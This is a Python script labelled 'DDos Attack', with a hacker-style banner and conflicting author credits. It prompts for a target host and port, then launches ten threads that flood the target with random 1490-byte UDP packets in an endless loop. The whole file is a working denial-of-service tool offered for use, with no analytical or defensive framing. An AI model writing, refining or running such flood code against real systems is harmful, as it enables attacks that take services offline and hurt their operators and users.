#!/usr/bin/python3
# This code write by (Mr.nope)
# DDos Attack v2.0.0
import os
try:
   from colorama import Fore,init
   init()
except ImportError:
    os.system("pip3 install colorama")
import time
import sys
import socket
import threading
import platform
import random
system = platform.uname()[0]
def title():
    if system == 'Linux':
      os.system("printf '\033]2;DDos-Attack\a'")
    elif system == 'Windows':
        os.system("title DDos-Attack")
    else:
         print("\nPlease, Run This programm on Linux, Windows or MacOS!\n")
         sys.exit()         
def cls():
    if system == 'Windows':
      os.system("cls")
    elif system == 'Linux':
        os.system("clear")
    else:
         print("\nPlease, Run This programm on Linux, Windows or MacOS!\n")
         sys.exit()
class color:
    red = '\033[91m'
    green = '\033[92m'
    End = '\033[0m'
    blue = '\033[33m'
def menu():
    title()
    cls()
    print(color.green + """
     ______   ______   _______  _______         
    |      | |      | |       ||       |       
    |  _    ||  _    ||   _   ||  _____|  
    | | |   || | |   ||  | |  || |_____         
    | |_|   || |_|   ||  |_|  ||_____  |       
    |       ||       ||       | _____| |       
    |______| |______| |_______||_______|       \n""" + color.blue + """
         ----[This code write by Cryptonic & Pompompurin]----
        -------[Version 2.4.1]-----------""" + color.End)
    host = input("\nEnter Host/Ip: ")
    time.sleep(1)
    port = int(input("\nEnter Port: "))
    ##################################################
    UDP_PORT = port
    bs = random._urandom(1490)
    time.sleep(1)
    cls()
    ip = socket.gethostbyname(host)
    print(color.red + "=============================================================================\n" + color.End)
    print("Target IP:", ip)
    time.sleep(1)
    print("\nTarget port:", UDP_PORT)
    print(color.red + "=============================================================================\n" + color.End)
    time.sleep(2)
    sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    def run(k):
        while True:
            sock.sendto(bs,(ip,port))
            print(f"{Fore.GREEN}Send Packet To {Fore.RED}{ip}{Fore.WHITE}")
            
    for i in range(10):
        ch = threading.Thread(target=run, args=[i])
        ch.start()
if __name__ == '__main__':
    try:
        try:
           menu()
        except EOFError:
            print("\nCtrl + D")
            print("\nExiting...")
            sys.exit()
    except KeyboardInterrupt:
        print("\nCtrl + C")
        print("\nExiting...")
        sys.exit()
# Thanks For using :)